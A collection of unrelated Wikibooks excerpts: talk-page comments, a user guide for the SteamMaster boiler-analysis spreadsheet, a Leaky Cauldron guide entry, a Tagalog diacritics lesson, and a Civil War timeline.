* [[Foundations of Education and Instructional Assessment/Edition 2/Table of Contents/Chapter 1/1.7.3]],
* [[Foundations of Education and Instructional Assessment/Edition 3/Foundations Table of Contents/Chapter 1/1.7.2]], and
* [[Foundations of Education and Instructional Assessment/Edition 4/Foundations Table of Contents/Chapter 1/1.7.1]].
So for the printed textbook,
* (a) Should we include all four editions? Or
* (b) Should we pick only the &quot;best&quot; version of each module, flipping a coin when they are about the same? (It looks to me like sometimes the &quot;latest&quot; edition is not always the best one). Or
* (c) Should we somehow create one merged page with the best parts of each original edition, a single page better than any one of these slightly-different original editions?

I think I would rather read (c), although (c) is more work than (a) or (b).
But is it possible to do (c) without messing up the learning process students get while putting together the next edition?

[[User:Rajaa krayem|Rajaa krayem]] ([[User talk:Rajaa krayem|talk]]) 02:50, 12 April 2009 (UTC)  I like to choose (C)for fairness and great diversity of knoledge,and being up to date for some teacher to take it as refrence.</text>

'''Using SteamMaster'''
SteamMaster was created using Microsoft Excel 2002. Protection was enabled to prevent accidental overwriting of calculated cells, although there is no password required. Excel 2002 allows protected cells to be selected, formatted, and pivot tables to be used. Other versions may not allow these functions. Therefore you may need to unprotect sheets to use SteamMaster.

'''Open SteamMaster'''
A dialog box will tell you that SteamMaster contains macros. Enable them. SteamMaster may also ask if you want to open as ready-only. Select no to allow editing and data entry. 

'''Calculations'''
Many steam properties are calculated using equations (curvefits) that match values from steam tables or properties books. The equations are not reproduced in the guide because they are visible in the spreadsheet cells.

'''SteamMaster Custom Menu'''
When you open SteamMaster, a custon &quot;SteamMaster&quot; menu is added to Excel. SteamMaster is fully functional as a spreadsheet, without the need to use any of the automated features in the SteamMaster Menu. However, the custon menu can facilitate the following functions:

'''''Add Boiler'''''
You can add a boiler manufacturer and model to the analysis from the database. A new worksheet tab is created and the boiler is added to the summary page. If the current model is not currently in the database, you can add one.

'''''Add boiler to Database'''''
You can add a boiler to the database by entering manufacturer, model and specifications.

'''''Add Trap Manufacturer'''''
You can add a steam trap to the database by completing manufacturer, model and specification fields. If the manufacturer is not in the pull-down menu, enter the new manufacturer.

'''''Boilers'''''
The Boiler Navigator will take you to specific Boiler tabs.

'''''Summary'''''
The Navigator will take you to the Summary Sheet.

'''''Delete Boiler Sheets'''''
You can add or delete boilers from the current project. For example, if you have two boilers, and SteamMaster was saved with four boilers, you can delete boiler sheets. This operation will also delete a boiler from the Summary Sheet. SteamMaster will ask if you want to delete each sheet one at a time. If you want to keep boilers 1 and 2, run &quot;Delete Boiler Sheets&quot; and respond &quot;no&quot; to the dialog box, &quot;Do you want to delete boiler number 2?&quot; Repeat &quot;no&quot; until you reach the last boiler that you want to delete, and respond &quot;yes.&quot;

'''''Calculate Savings Summary'''''
Normally, SteamMaster recalculates changes automatically. If however, you reset calculation to manual, this function will recalculate the results.

'''''Help''''' This manual is available in online help format, indexed by worksheet tabs.

==Summary Sheet==
The Summary Sheet allows you to enter information that is common to all boilers in the steam system and operating conditions for each boiler. It allows you to match boiler fuel use to fuel bills, and summarizes results from five potential system improvements. Data entry cells have a blue font. Other cells have labels and formulas that are protected. There is no password, but they are protected so you cannot inadvertently overwrite a formula.

==Operating Conditions==
'''Company ID'''
Identify the company in an appropriate manner.

'''Annual Operating Time (hours)'''
Enter the number of hours per year that any boiler operates. Individual boiler operation is specified later for each firing rate. The time that the system is hot is used to calculate losses from uninsulated pipes, and steam and trap leaks.

'''Elevation (feet)'''
Elevation in feet above sea level is used to calculate the atmospheric pressure, and therefore air density and steam properties at the boiler location.

'''Condensate Return(%)'''
Enter percentage of steam condensate that is returned to the boiler. Steam flow can be estimated from boiler firing rate (input Btu/hr) x boiler efficiency [default = 80%]/steam enthalpy [default = 1000 Btu/lb]. Look for a makeup water meter reading in a log or a chemical treatment company report.

'''Steam System Volume (ft3)'''
Steam Volume is used to calculate boiler cycling times (boiler shuts down) when system load is less than the minimum-firing rate. Many boiler manufacturers specify the &quot;steam chest&quot; or &quot;steam volume&quot; as the volume above the water level in a boiler. A curve fit for scotch marine boilers produced a default value [default = 0.2 ft3/hp]. System volume also includes piping. The Pipe Loss tab includes columns for surface area and volume for piping that you enter in the table.

'''Air Humidity Ratio (lbv/lb dry air)'''
The absolute humidity, specific humidity, or humidity ratio is the ratio of the mass of water vapor in a volume of air to the mass of dry air. It is used to calculate the boiler efficiency loss due to heating water vapor in combustion air. Absolute humidity can also be found from relative humidity and other air properties in psychometric charts.

==Temperatures==
'''Operating Steam Temperature (F)''' 
The saturated temperature (F) is calculated for the existing system Operating Pressure.

'''Proposed Steam Temperature (F)'''
The saturated steam temperature (F) is calculated for the Proposed system operating Pressure in the case you recommend reducing system pressure. 

'''Condensate Temperature (F)'''
The condensate temperature is calculated from the condensate return system pressure. For example, an atmospheric condensate system would have a condensate temperature of 212 F. Condensate temperature is used to calculate flash steam losses. Condensate loses heat in the process of returning to the boiler, and might arrive at 160-180 F. However, we base the flash steam calculation on the saturation temperature at the steam trap.

'''Inlet Air Temperature (F)'''
Combustion air is heated from inlet conditions to boiler stack conditions. Inlet air properties and used in combustion efficiency calculations. [default = 80 F]

'''Inlet Water Temperature (F)'''
Water is heated from inlet temperature to saturated steam at the system pressure. Well water and city water temperature both vary with location and season. [default = 50 F]

==Pressures==
'''Operating Pressure (psig)'''
System pressure varies with load and control range set points. Enter average operating pressure for existing system.

'''Proposed Pressure (psig)'''
Enter a higher or lower pressure if you recommend changing the pressure. Efficiency and losses are calculated using the proposed pressure and presented in the &quot;proposed&quot; columns.

'''Condensate return pressure (psig)'''
Condensate is usually reduced to atmospheric pressure (0 psig) at the steam trap and collected in a condensate tank. The condensate is then pumped back to the boiler room, usually to a feedwater tank. When saturated liquid is reduced in pressure, it becomes superheated. Some of the liquid flashes to vapor until the liquid temperature reaches the saturation temperature at the lower pressure. For example, when condensate at 100 psig is reduced to 0 psig. 13% of the condensate flashes to steam, which represents a significant system loss. A pressurized return will supply low-pressure steam that can be used for other purposes, including heating makeup water. Enter existing condensate return pressure. [default = 0 psig]

'''Atmospheric pressure (psia)'''
Atmospheric pressure (0 psig) is calculated in terms of absolute pressure (psia), compared with a perfect vacuum base on elevation and above sea level. For example, atmospheric pressure at sea level is 14.7 psia. Enter elevation and observe the calculated pressure, which is used in the calculations.

'''Pressure range (psi)'''
System pressure is maintained in a pressure range by the system controls, provided there is adequate boiler capacity to meet the load. When the boiler operates at pressure falls until the boiler restarts. Enter this control pressure range, which is used to calculate how long the boiler runs to raise the pressure this amount, and how long it stays off. Pressure range is used in the cycle loss calculations.

==Fuel==
'''Fuel Type'''
Choose the fuel type from a pull-down menu of six fuels (coal, No. 2 fuel oil, No. 6 fuel oil, natural gas, propane, and wood). Fuel properties affect efficiency calculations and are considered in more detail in the Fuel Sheet.

'''Fuel Cost ($/MMBtu)'''
Enter fuel cost dollars/ million Btu.

==Boiler Summaries==
The boiler summary tables allow you to enter firing rates and operating hours for each boiler and to match total fuel use for all boilers to fuel bills. It then summarizes existing and proposed efficiencies and energy use and savings for each firing rate, total for each boiler, and total for system.

'''Firing Rate'''
Enter up to four firing rates, expressed as a percentage of full fire, for each boiler and hours that each boiler operates at each rate.

'''Annual Hours'''
Enter hours that each boiler operates at each firing rate. Note that total operating hours for each boiler at all firing rates is calculated at the bottom of each table.

'''Efficiencies'''
Calculations of efficiencies for existing and proposed conditions are calculated in each boiler sheet and summarized. 

'''Cost Savings'''
The difference between existing and proposed conditions yields energy and cost savings, at the fuel cost you entered.

'''Boiler Annual Energy Use (MMBtu/yr)'''
Annual energy use for existing and proposed conditions is totaled for each boiler individually and for the system in the Savings Summary table at the bottom.

==Savings Summary==
'''Recommendations'''
Savings for five potential system improvements are summarized. Not all opportunities apply to all systems, and there are other opportunities that are not included. The five recommendation are:

  - Tune Boilers
  - Insulate Steam Pipes
  - Repair Steam Leaks
  - Repair Trap Leaks
  - Recover Flash Steam

'''Tune Boilers'''
Existing and proposed boiler efficiencies are calculated using the AMSE Indirect Method in the individual boiler sheets. Energy and cost savings for steam system are included in the summary table.

'''Insulated Steam Pipes'''
Results from insulating uninsulated steam pipes are summarized from the Pipe Loss sheet. The efficiencies are losses expressed as a percentage of use. The proposed conditions assume that most of the pipe heat loss will be recovered with insulation. Enter the proposed heat loss as a percentage of uninsulated heat loss for the insulation you select in the Pipe Heat Loss Factors table on the Pipe Loss sheet. [default = 10 %]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings.


'''Repair Steam Leaks'''
Heat losses for steam leaks are calculated on the Steam Leaks tab and summarized here. Enter the proposed steam leaks as a percentage of existing steam leaks. [default = 10%]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings. 

'''Repair Trap Leaks'''
Heat losses for steam traps are calculated on the Trap Leaks tab and summarized here. Enter the proposed trap leaks as a percentage of existing trap leaks. [default = 10%]. We divide heat loss savings by system boiler efficiency to calculate energy and cost savings.

'''Recover Flash Steam'''
Condensate is usually reduced to atmospheric pressure(0 psig) at the steam trap and collected in a condensate tank. The condensate is the pumped back to the boiler room, usually to a feedwater tank. When saturated liquid is reduced in pressure, it becomes superheeated. Some of the liquid flashes to vapor until the liquid temperature reaches the saturation temperature at the lower pressure. For example, when condensate at 100 psig is reduced to 0 psig, 13% of the condensate flashes to steam. Because the latent heat of vaporization at atmospheric pressure is 970 Btu/lb this represents a significant system loss. The existing efficiency and energy column presents this heat loss for the system and condensate system pressure, divided by system boiler efficiency.

A pressurized condensate return system will allow you to recover some or all of the flash steam. Low-pressure steam can be used for other purposes, including heating makeup water, using existing condensate return (%). The savings column show the calculation for the amount of flash steam that could be used to heat makeup water directly in the makeup water or deaerator tank without adding additional heat exchangers. The proposed column shows the remaining quantity of flash steam that is available. If you identify a use and a system to apply it, then reduce the proposed steam use, and the savings will increase proportionately. Note that both the flash steam quantity and use for makeup water vary with condensate system pressure and condensate return percentage.

'''Total'''
System efficiencies are boiler efficiencies, including radiation, convection and cycling losses, minus the four identified system losses: uninsulated pipes, steam leaks, trap leaks, and flash steam. Total existing and proposed system energy use is less meaningful because boiler use (shown on the tune boiler recommendation row) includes system losses. However, the total energy and cost savings for the five recommendations is the result of system improvements.

==Boiler Sheets==
Enter information in the cells where font is in blue. For each individual boiler sheet, enter information that is specific to the corresponding boiler.

===Boiler Nameplate===

'''Manufacturer'''
There is a database of boiler manufacturers, models and specifications on the Boiler Mfgrs sheet. you may add a boiler from the database or add a new boiler to the database.

'''Model'''
Enter the model from the nameplate.

'''HorsePower'''
Boiler horsepower is different than electrical or mechanical horsepower. If boiler horsepower is not on the nameplate, you might find one of the following conversions helpful:

  - 1 boHP = 33,500 Btu/hr
  - 1 boHP = 34.5 lb/hr of steam
  - 1 boHP = 5 ft^2 of heat transfer surface (rule of thumb)

'''Maximum Firing Rate'''
Enter in MMBTU/hr for all fuels. This is input rate, and therefore should be around 40,000 Btu/hr-BoHP.

'''Boiler Type'''
Choose the boiler type from a pull-down menu among five types:

  - Cast Iron Sectional
  - Fire Tube
  - Hot Water
  - Scotch Marine
  - Water Tube

'''Minimum Firing Rate'''
The lowest rate at which the boiler can operate is usually between 10 and 40%, the smaller rate for larger boilers. Turndown is the ratio of maximum to minimum fire. Minimum fire affects boiler cycling losses at loads below minimum fire.

'''Control Type'''
Choose the control type from a pull-down menu among three types:

  - Full Modulating
  - Low-High-Low
  - On-Off

==Cycling Losses==
When a boiler cycles off and on, air is blown through the combustion chamber to remove unburned fuel before ignition for safety reasons. Purge cycles carry energy from the system and constitute a loss, the magnitude of which depends on cycle times. The following is a combination empirical and calculated approach to estimating cycle losses.

'''Purge air temperature'''
During the purge cycle air is blown through the boiler. In theory the exit temperature can be calculated; in practice it is a complicated calculation. Based on several measurements, we use the exit air temperature as percentage of saturated steam temperature, both relative to inlet air temperature, in our heat loss calculations. [default = 75%]

'''Purge Cycle Time'''
This value is the time during which air is blown through the boiler without fuel for the purge cycle. Enter the average time in seconds for both pre (before burner) and post-purges. The program assumes both purges are the same and multiplies by 2 to account for both pre and post purges. [default = 30 seconds]

'''Standby Cycle Time'''
It is the time for a complete boiler cycle when the standby load is less than the boiler minimum firing rate. The approach is the calculate the amount of time that the boiler will require to raise the pressure in the system volume by the controls pressure range amount. It further considers the ratio of the boilers load to the minimum firing rate to calculate how long the boiler can stay off. The cycle time includes pre and post purges, burner operation, and the time boiler is off. Cycle time is used to calculate the cycling losses when the boiler is on standby firing rate. 

==Stacking Conditions==
'''o2 (%)''' Most combustion analyzers or stack gs sensor measure the volumetric percentage of oxygen in the stack gas. Enter the measured value.

'''CO2 (%)''' SteamMaster calculates Carbon dioxide concentration on a volumetric basis. Some test equipment measures CO2 instead. If your does, you will have to lookup the corresponding O2 concentration to use SteamMaster.

'''CO (ppm)'''
Carbon monoxide concentration is quantifiable measure of unburned fuel. Most combustion analyzers measure CO in parts per million (ppm). Levels over 400 ppm are consedered dangerous for people. Many combustion analyzers do not measure levels above 400 ppm. Note that this level (0.04%) has a negligible effect on combustion efficiency, but may be an indicator of burner or other boiler problems. SteamMaster calculates the effects of CO, which can be significant at dangerously high concentrations. If you encounter stack concentrations of CO over 400 ppm, advise plant management to have the boiler maintained immediately. 

'''Stack Temperature (F)'''
The temperature of stack gases is used to calculate the amount of heat leavings the boiler.

'''Net Stack Temperature (F)'''
Stack minus Inlet Air Temperatures is used to calculate the amount of heat the boiler adds to the fuel and combustion air mixture.

==Efficiency==
Combustion efficiency is calculated using the ASME indirect method (see COMBUSTION EFFICIENCY DEFINITIONS section) in which the following losses are calculated and subtracted from 100%. The method and formulas are documented in the ASME standards.

'''Dry Gas Losses'''represent sensible heat leaving the boiler stack.

'''Moisture Formation''' is the loss calculated from burning hydrogen in the fuel.

'''Moisture in Fuel (wet basis)''' is the loss required to evaporate and heat moisture contained in the fuel. Most fossil fuels contains little or no moisture. Wood fuel often has a significant moisture content.

'''Carbon Monoxide''' are losses from the energy of formation of CO that have not been fully released in the combustion process.

'''Losses due to ash''' Wood generally contains ash, which does not combust. Therefore, ash concentration (generally small) is subtract from the heating value of the fuel.

'''Moisture in the air''' is another source of water that removes heat from the system.

'''Combustion Efficiency''' Subtract the previous losses from 100% to calculate combustion efficiency.

'''Radiation/Convection Losses'''
Hot boilers lose heat to their surrounding by radiation and convection. SteamMaster uses a curvefit of a graph found in the ASME Steam Unit Generation standard. ?????

Section &quot;Relationship with Monoids&quot;
I am not sure if this is a error in the original text:

''Monoids, then, look very similar to MonadPlus instances. Both feature concepts of a zero and plus, and indeed MonadPlus can be a subclass of Monoid (the following is not Haskell 98, but works with -fglasgow-exts):

instance MonadPlus m =&gt; Monoid (m a) where
  mempty  = mzero
  mappend = mplus''

And I think the instance declaration should be:

''instance Monoid (m a) =&gt; MonadPlus m where
  mzero = mempty
  mplus = mappend

== General Overview ==

The '''Leaky Cauldron''' is a popular Wizarding pub in London. It is the entrance to [[Muggles' Guide to Harry Potter/Places/Diagon Alley|Diagon Alley]]. For much of the end of the 20th Century, Tom was the landlord.

== Extended Description ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

The pub was built by Daisy Dodderidge in 1500 &quot;to serve as a gateway between the non-wizarding world and Diagon Alley.&quot; It rents rooms, has a bar, several private parlor rooms, and a large dining room. 

To Muggles, the pub appears to be a broken-down old shop front on Charing Cross Road. The rear of the pub, however, opens up onto a chilly courtyard and the entrance to Diagon Alley. To gain access, a witch or wizard taps a specific brick in the wall with his or her wand. A doorway to Diagon Alley then forms which then re-arranges back to the original wall after the person(s) walk through.

[[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] is re-introduced to the Wizarding World on his 11th birthday, July 31st 1991, by [[Muggles' Guide to Harry Potter/Characters/Rubeus Hagrid|Rubeus Hagrid]]. A major part of that re-introduction happens when Hagrid escorts Harry through The Leaky Cauldron. Harry is embarrassed to find out that he has been famous all his life, all the more because it is for something he has no recollection of doing.

Harry spends the last fortnight of his summer vacation in his [[Muggles' Guide to Harry Potter/Books/Prisoner of Azkaban|third year at Hogwarts]] living in The Leaky Cauldron. This is done, apparently, to protect him from the escaped murderer, [[Muggles' Guide to Harry Potter/Characters/Sirius Black|Sirius Black]]. During this time, watching the clientele of the Leaky Cauldron, Harry believes that he sees a hag.

In Harry's [[Muggles' Guide to Harry Potter/Books/Half-Blood Prince|sixth year]], we are shown a memory of [[Muggles' Guide to Harry Potter/Characters/Albus Dumbledore|Professor Dumbledore's]] in which the young [[Muggles' Guide to Harry Potter/Characters/Tom Marvolo Riddle|Tom Riddle]] is told to ask the landlord at the Leaky Cauldron for help getting in to Diagon Alley. The landlord's name is then given as Tom. As internal evidence in the series suggests Tom Riddle was born in the early 1920s, and at the time of Dumbledore's memory he would have been 11, Tom would have been the landlord in about 1930 as he was up until the end of the Potter series, in 1998. If he has been landlord of The Leaky Cauldron for sixty years when Harry first sees him, it is little wonder that Harry thinks him extremely old and compares him to &quot;a gummy walnut&quot;.

Tom is still behind the bar in the final book in the series, when the Trio pass through on their way to Diagon Alley and [[Muggles' Guide to Harry Potter/Places/Gringotts|Gringotts Bank]].

== Analysis ==

As is mentioned in the article about [[Muggles' Guide to Harry Potter/Places/The Three Broomsticks|the Three Broomsticks]] in [[Muggles' Guide to Harry Potter/Places/Hogsmeade|Hogsmeade]], British village life, and to a large extent British city life, revolves around the pub, the &quot;home away from home&quot; for most British people. It is unsurprising that there should be a Wizarding pub in London; and equally it should come as no surprise that the pub acts as a connection between the Wizarding and Muggle worlds. Pubs quite often acted as rest stops for horse-drawn carriages, and so often marked transitions in travel; making a pub also serve as the transition to magical London seems a simple extension of that.

In [[Muggles' Guide to Harry Potter/Places/Hogwarts School of Witchcraft and Wizardry#School population|the article on Hogwarts]], it was calculated that, based on the population of the school, there is one wizard for every 6,000 Muggles. Given a Muggle population of 7.1 million in Greater London as of 2001, this gives a total of about 1,200 wizards in all of London. This population would represent a fairly small village, spread over a significant geographical space. As wizards will tend to congregate, for instance in the villages of Hogsmeade and [[Muggles' Guide to Harry Potter/Places/Godric's Hollow|Godric's Hollow]], it is likely that in fact there are fewer than a thousand wizards in London. All the same, they will need places where they can meet and be assured that no Muggles will be alarmed by their actions, and what better place than a pub? And just as a Muggle village of a thousand people can support two or three pubs, so could we expect that the London wizard population could support the Leaky Cauldron, plus possibly two or more others.

Like many pubs, the Leaky Cauldron serves as something of a neutral ground. Harry notes that he believes he sees a hag there, and even under the Death Eaters, people are still visiting and Tom is still in business. As mentioned in the article on the [[Muggles' Guide to Harry Potter/Places/Hog's Head Inn|Hog's Head]], there are pubs which position themselves for the family trade, and those which provide a home for the less savory interactions; the Leaky Cauldron is quite firmly in the former category, catering as it does for the families of Hogwarts students as they shop each August for the needs of their upcoming term. We can assume that shadier business is transacted in the darker corners, but we don't see it.

== Questions ==
{{Muggles' Guide to Harry Potter/Questions}}

== Greater Picture ==

{{Muggles' Guide to Harry Potter/Intermediate Spoiler}}

The author has said in interviews after publication of the seventh book in the series that the pub is later taken over by [[Muggles' Guide to Harry Potter/Characters/Hannah Abbott|Hannah Abbott]], who has married [[Muggles' Guide to Harry Potter/Characters/Neville Longbottom|Neville Longbottom]], then professor of [[Muggles' Guide to Harry Potter/Magic/Herbology|Herbology]] at Hogwarts. It is our opinion that this is not canon, and is unsupported by anything in the books; all we really know about Hannah is her family's encounters with [[Muggles' Guide to Harry Potter/Major Events/Death Eaters|Death Eaters]], and that she seems to get extremely nervous at exam time. Like so much else that has come to light in interviews after publication, it seems that this &quot;fact&quot; may have been made up on the spur of the moment in order to please the fans.

      <text xml:space="preserve">== YouTube Video on Voice over IP: Shenetta Richardson, Systems Engineer ==

The future of real time voice communications is evolving from the traditional TDM circuit switch infrastructure.  VoIP is simply the transmission of voice traffic over IP-base networks.  The Internet Protcol was originally designed for data networking.  The success of IP is becoming a world standard for data networking and has led to adaptation into the voice network which allows you to make voice calls using a broadband internet connection instead of the regular analog phone line.

== Palatuldikan (Diacritics)==
:''Continued from [[Tagalog/Lesson 1]]''
Diacritics are normally not written in everyday usage, be it in publications or personal correspondence. The teaching of diacritics is inconsistent in Filipino schools and many Filipinos do not know how to use them. However, diacritics are normally used in dictionaries and in textbooks aimed at teaching the languages to foreigners.

There are three kinds of diacritics used in Tagalog:

;Acute accent or ''pahilís'' : Used to indicate primary or secondary stress on a particular syllable; ''talagá''. It is usually omitted on words that are stressed on the penultimate (second to last) syllable; ''umága = umaga''. It is possible that there is more than one stressed syllable in a word, meaning that that ''pahilís'' mark may appear multiple times, as in ''Repúbliká''. If there is no diacritic on the last two syllables of a word, then it means that there is stress on the penultimate syllable; ''kásayahan'' is actually stressed on two syllables: ''&lt;u&gt;ká&lt;/u&gt;sa&lt;u&gt;ya&lt;/u&gt;han''.

;Grave accent or ''paiwà'' : It indicates that there is a glottal stop (/ʔ/) at the end of the word; ''akalà''. This mark may only appear at the end of a word that ends in a vowel. This mark does not indicate stress. Therefore, following the previously stated rule on stress, ''akalà'' is stressed on the second to the last syllable: ''a&lt;u&gt;ka&lt;/u&gt;là''.

;Circumflex accent or ''pakupyâ'' : It indicates that the final syllable of a word receives stress while there is a glottal stop (/ʔ/) that follows; ''sampû''. This is because it is a combination of the ''pahilís'' and ''paiwà'' marks. This mark may only appear at the end of a word that ends in a vowel. ''dálitâ = &lt;u&gt;dá&lt;/u&gt;li&lt;u&gt;tâ&lt;/u&gt;''

===Pronunciation cases===

Diacritics are an optional aspect of the Tagalog orthography. Most Filipinos (and Philippine news journals) write Tagalog without using any diacritic at all. However, pieces of Tagalog writing which use diacritics can occasionally be found in some religious journals, old books, and others.

A word in Tagalog spelled in a certain way without the diacritics can actually be pronounced in four ways, and each case results into a different meaning or a different word in itself. The four cases are:

&lt;b&gt;Stressed end&lt;/b&gt;

This case is where a word is stressed in the last or end syllable. The vowel of the last syllable should contain an acute diacritic mark.

Examples: &quot;akó&quot; (me), &quot;lakí&quot; (size), &quot;parú-paró&quot; (butterfly), &quot;sangá&quot; (branch), &quot;talagá&quot; (really)

&lt;b&gt;Unstressed end&lt;/b&gt;

This case is where a word is unstressed in the last or end syllable. In Tagalog, this entails the need to stress the penultimate or 2nd-to-the-last syllable. The vowel of the penultimate syllable should contain an acute diacritic mark.

Examples: &quot;bóbo&quot; (moron), &quot;hábal-hábal&quot; (motorcyle taxi), &quot;ílog&quot; (river), &quot;kasalánan&quot; (sin), &quot;sáko&quot; (sack), &quot;umága&quot; (morning)

The unstressed end case is the Tagalog's &lt;b&gt;default case&lt;/b&gt;. Readers who read a diacritic-supported Tagalog document should use the unstressed end case whenever he/she sees a word without any diacritic mark. Most Tagalog journals which employ diacritics only choose to use diacritics for unstressed end case words if those words could be confused as the words in the other cases. So they spell &quot;píto&quot; to differentiate whistle (&quot;píto&quot;) from seven (&quot;pitó&quot;). However, if the word has no corresponding word in another case, it is written without diacritics. So these journals will use &quot;umaga&quot; instead of &quot;umága&quot;, because no other &quot;umaga&quot; word exists in other cases.

Alternately, older Tagalog conventions often moves the acute diacritic mark from the penultimate syllable to the very first stressed syllable of the word. There are Tagalog words which have two or more stressed syllables in the first place. So &quot;kasalánan&quot; is spelled as &quot;kásalanan&quot; in older conventions because its first stressed syllable is &quot;ka&quot;. However, modern guidelines has deprecated this rule, because the Filipino people, most of which has no formal linguistic training, even find it difficult to pinpoint which syllables are being stressed and not. So &quot;kasalánan&quot; is the correct diacritic-supported spelling using modern guidelines. 

&lt;b&gt;Glottal stopped end&lt;/b&gt;

This case is where a word is applied with a glottal stop in the last or end syllable which is unstressed. The vowel of the last syllable should contain a grave diacritic mark.

Examples: &quot;akalà&quot; (assumption), &quot;bagà&quot; (lungs), &quot;gurò&quot; (teacher), &quot;labò&quot; (unclear), &quot;lahì&quot; (race), &quot;pukè&quot; (vagina)

Because the last syllable is unstressed, then just like the unstressed end case, the penultimate syllable is therefore stressed. This means we could spell it like &quot;akálà&quot;. However, there is no need to add the acute diacritic mark in there. So &quot;akalà&quot; is okay.

&lt;b&gt;Glottal stopped stressed end&lt;/b&gt;

This case is where a word is applied with a glottal stop in the last or end syllable which is stressed. The vowel of the last syllable should contain a circumflex diacritic mark. You can imagine &quot;â&quot; as &quot;á&quot; and &quot;à&quot; combined.

Examples: &quot;larô&quot; (play), &quot;salitâ&quot; (word), &quot;sawî&quot; (emotionally devastated), &quot;tahî&quot; (sew)

=== Older conventions ===
Before the standardization of Tagalog during the mid-20th century, the acute accent (''pahilís'') functioned in the same way as it is used in Spanish orthography today. The older version is no longer in use.

Words stressed on the last syllable use an accent when they end with a vowel (''a, e, i, o, u''), with ''-n'', or with  ''-s'', as in ''Magandá'', ''bilí'', ''Inglés''. Words stressed on the next-to-last syllable use an accent when they do not end with a vowel (''a, e, i, o, u''), with  ''-n'' or with  ''-s'', as in ''Kabuháyan'', ''Umútang''. Words stressed on other syllables ''always'' take the accent, as in ''Matemátika''. Words not stressed on the last syllable but end with a vowel (''a, e, i, o, u'') do not use the acute accent, unless stress is on the final vowel. In the older system, the word ''Repúbliká'' would be written simply as ''Repúblika''. The newer version &quot;''Repúbliká''&quot; is written this way in order to be consistent with the new rules for using diacritics (&quot;If there is no accent upon the last two syllables of a word, then the stress is on the second-to-last syllable&quot;).

== Clock &amp; Data recovery ==
=== The CDR function is a simple one and just three architectures are sufficient to model it. The actual implementation of the CDR may differ from the neat, simple analog structure of the mathematical models. Complex digital blocks, DLLs, DSPs may disguise the architecture, but the fundamental operation of the CDR will not differ. Knowledge of the three models is fundamental to imagine, specify, design, check, measure and interpret the behavior of the CDR. Reference to them is the best way to avoid confusion and errors. ===

This article needs major re-writing. In actual fact there are three inflectional tenses: future, conditional and preterite: all with person conjugations. All the rest of the tenses are formed with auxiliaries. However in literary Welsh, the future is often used when talking in the present, and there are also inflectional imperfect and perfect tenses. I will do this unless there is opposition. [[Special:Contributions/86.26.86.10|86.26.86.10]] ([[User talk:86.26.86.10|talk]]) 12:41, 28 March 2009 (UTC)

      <text xml:space="preserve">If I might be so bold, might I suggest this page would function much better with images. I am not sure if that's in the style of Wikibooks.

The page is excellent as a quick reminder of what order everything falls out in (particularly that Wu/Tan/Bong/Gahn bit) but if you don't already know what the e.g. Huen sau is, this page will be completely opaque. Perhaps the hand positions etc could be linked to pages describing how they are performed.

I hope you don't mind this mild nitpicking. Thank you for recording the form online. - [[Special:Contributions/124.168.52.162|124.168.52.162]] ([[User talk:124.168.52.162|talk]]) 13:27, 28 March 2009 (UTC)

It's a fine suggestion. In theory I'm working on both an illustrated version of the Wing Chun Forms book, to be released as PDF with embedded photos, and a Wing Chun Movements book, describing how to do the named movements, also with photos. In practice, I'm up to my ears in family and work. Expected release date 2020&amp;hellip; [[User:SteveF|SteveF]] ([[User talk:SteveF|talk]]) 03:46, 8 July 2009 (UTC)

I agree entirely that this page needs imagery; without it, the article is hardly more than a jumble of words! If the author, SteveF is not up to adding the imagery for the reasons given, then someone else should be given permission to do so, or to post his/ her own (new) article, with extensive imagery (i.e., taking nothing for granted, or assuming that the reader is a greenhorn). I was going to post a comment suggesting that imagery was sorely needed here when I clicked on the Discussion tab and saw that someone else had already done so, i.e., had had the same immediate gut response to the article as had I, a greenhorn, by the way.[[User:Wikiaide|Wikiaide]] ([[User talk:Wikiaide|discuss]] • [[Special:Contributions/Wikiaide|contribs]]) 06:22, 31 August 2011 (UTC)</text>

      <text xml:space="preserve">The Origins of the American Civil War

&quot;One eight of the whole population was coloured slaves, not distributed generally over the Union, but localised in the southern part of it.  These slaves constituted a peculiar and powerful interest.  All knew that this interest was somehow the cause of the war.  To strengthen, perpetuate, and extend this interest was the object for which the insurgents would rend the Union even by war, while the government claimed no right to do more than to restrict the territorial enlargement of it.&quot; Abraham Lincoln, 2nd inaugural address.

1793: Invention of the cotton gin.  This made possible the expansion fo slavery inland and allowed for the continuance of slavery as a viable economic system.  By 1860 the South produced 4 million bales of cotton, which was 50% of US exports.

1808: US abolished the slave trade.  The value of slaves incresaed to $2,000 by 1850.  Despite only 25% of South owning slaves the existance of slaves reminded poor whites that there was a class below them in society.  Slavery permeated all aspects of Southern life, therefore, an attack on slavery was seen as an attack on the South.
&quot;Slavery was much more that an economic system.  It was a means of maintaining control and white supremacy... The economic, social and racial centrality of slavery to the Southern way of life focused the region's politics overwhelmingly on defence of the pecliar institution.&quot; A. Farmer.

1819: 11 'free' states, 11 'slave' states.  The senate was even but the North had began to dominate the House with its rapidly growing population.

1820: Missouri Compromise.  Missouri, a slave state, would join the union with Maine, a free state, to maintain the balance.  No slavery was to be subsequently allowed North of the 36'30' parallel.  The issue was not resolved, merely delegated to a later date.

1833: Britain abolished slavery throughout its empire.  This encouraged the Northern abolitionists, with a noticeable rise of militant abolitionists.

1836-48: 3 slave states and 3 free states join the union.  This preserved te sectional balance in the senate

Late 1840s: Gowing tension due to: the acquisition of Oregon in 1846, California and New Mexico in 1848, the discovery of Gold and the migration of Mormons to Utah which led to the rapid westward migration and growth.  The Wilmot Proviso 1846, which excluded slavery from any territory acquired from Mexico, was passed in the House but defeated in the Senate.  The Calhoun Doctrine 1847, argued that territories were the common property of all states, that any US citizen was free to settle in the US with its property (slaves), that the states were sovereign, they had the right to secede if the North ignored Southern interests and threatened slavery, then the South was justified in leaving the Union.

1850: Compromise.  California to join the Union as a free state, the end of slavery in Washington D.C, in Utah and New Mexico 'popular sovereignity' would decide whether the state would be slave or free, and a more stringent Fugitive slave law.
David Potter argues it was &quot;an armistice rather than a compromise&quot;

1852: Publication of 'Uncle Tom's Cabin'

1854: Kansas-Nebraska Act.  Addition of two new states, their status to be decided by poplar sovereignity, undermined the Missouri Compromise.  This re-iginited sectional tensions and fed Northern fears of a 'slave power' base.

1856: Brooks, a Southern representative, beat unconscious the abolitionist senator Sumner, on the senate floor.  The start of the violence.

